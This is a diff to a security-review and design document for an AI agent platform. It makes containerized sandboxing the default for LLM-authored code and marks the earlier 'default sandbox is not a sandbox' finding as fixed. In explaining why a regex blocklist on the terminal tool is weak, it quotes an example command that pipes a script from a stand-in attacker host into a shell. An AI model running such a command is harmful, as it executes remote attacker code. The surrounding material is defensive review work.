@@ -1058,16 +1058,25 @@ when `sandbox.container_runtime_enabled` is on for the company.
 **One switch** (since 2026-10-01, TX-01): `container_runtime_enabled(company_id)`
 resolves that flag through its whole chain — the company's row, the global row,
 `AI_FLAG_SANDBOX_CONTAINER_RUNTIME_ENABLED`, then the flag's default, which *is* the
-deployment's `SANDBOX_CONTAINER_RUNTIME_ENABLED` (off unless set). Before, the flag
+deployment's `SANDBOX_CONTAINER_RUNTIME_ENABLED` (**on** by default since TL-01, below). Before, the flag
 was declared `True` — the admin Feature Flags page showed container sandboxing on —
 while the runtime consulted it only when a DB row existed and otherwise used the
 setting, which was off. A call's context can no longer choose the runtime (the
 `container_runtime` key is gone).
 
-**No silent downgrade** (TL-01, in part): a `ContainerRuntime` that cannot be built
+**No silent downgrade** (TL-01): a `ContainerRuntime` that cannot be built
 raises instead of falling back to the host, and a Docker failure inside it is an
-`ExecResult` error, not a host retry. Flipping the default to containers needs the
-sandbox images and a durable workspace volume (P11).
+`ExecResult` error, not a host retry.
+
+**The container is the default** (TL-01, decision D29, 2026-10-06):
+`SANDBOX_CONTAINER_RUNTIME_ENABLED` defaults to `true`, now that the workspace is durable
+(TL-16), the container sees skill files and artifacts read-only (TL-17), deliverables come
+through the drop box (TL-36), the network is per call (TL-15) and the browser runs inside
+(TL-18). A host without Docker or the `hb-sandbox` image refuses sandbox calls, and the
+error names the setting and both ways out (start Docker and build the image, or opt out).
+A development machine opts out in `.env` with `SANDBOX_CONTAINER_RUNTIME_ENABLED=false`;
+production never does. Inside a real boundary `terminal`'s blocklist (TL-42) is the speed
+bump it was always going to be.
 
 The tool-synthesis test harness (`ToolSandboxTester`) writes its files under the
 company's workspace — the directory a tenant container mounts — rather than bare
@@ -1906,8 +1915,8 @@ was deleted under FE-30.)
 | `video_edit`, `video_add_sound` | no | yes | compute only | 300 s ffmpeg timeout; input and output paths confined to the company's files |
 | `social_api` | yes — 8 third-party APIs | no | **yes — the tenant's ad budget** | OAuth token scoping only. EXPERIMENTAL status is not enforced at execution |
 | `crm/*` | yes — tenant endpoints, Google | no | no | credentials scoped by `company_id` |
-| `sandbox_code` | **yes — unrestricted under the default runtime** | yes — anywhere the OS user can write | compute | see §12.2 |
-| `terminal` | **yes — unrestricted under the default runtime** | yes | compute | 13-pattern blocklist |
+| `sandbox_code` | no — `--network none` (the host runtime, a development opt-out, is unrestricted) | yes — its workspace and drop box | compute | the company's container (§12.2) |
+| `terminal` | no — `--network none` (the host runtime is unrestricted) | yes — its workspace and drop box | compute | the company's container; a 13-pattern blocklist |
 | `headless_browser` | yes — public http/https hosts | yes — screenshots, to the drop box | compute | in the container, the `web` proxy refuses internal addresses; on the host, every request passes the SSRF guard; `evaluate` runs arbitrary JS by design |
 | `meta_entity_creator` | no | no | indirectly — creates agents that spend | 3-per-execution limit, daily cap, semantic dedupe |
 | `meta_entity_executor` | no | no | **yes — triggers a child run** | hard `$1.00` cap |
@@ -1915,12 +1924,11 @@ was deleted under FE-30.)
 
 ### 20.2 The five findings a reviewer should escalate
 
-1. **The default sandbox is not a sandbox.** `SubprocessRuntime` runs
-   LLM-authored code as the backend OS user with full filesystem and network
-   access and no resource limits. `ContainerRuntime` — which provides the actual
-   isolation — is OFF by default at both the settings and flag level. Any
-   deployment running untrusted prompts against `sandbox_code` or `terminal`
-   should treat that as an outstanding P0.
+1. ~~**The default sandbox is not a sandbox.**~~ Fixed 2026-10-06 (TL-01, D29):
+   `ContainerRuntime` is the default; a host that cannot run it refuses sandbox calls.
+   `SubprocessRuntime` — LLM-authored code as the backend OS user, with full filesystem
+   and network access and no resource limits — runs only where a development `.env`
+   opts out. Any deployment that sets that opt-out is back to the old P0.
 
 2. **`terminal`'s blocklist is a speed bump.** Thirteen regexes cannot enumerate
    the dangerous half of a shell. `curl attacker.example | sh`,
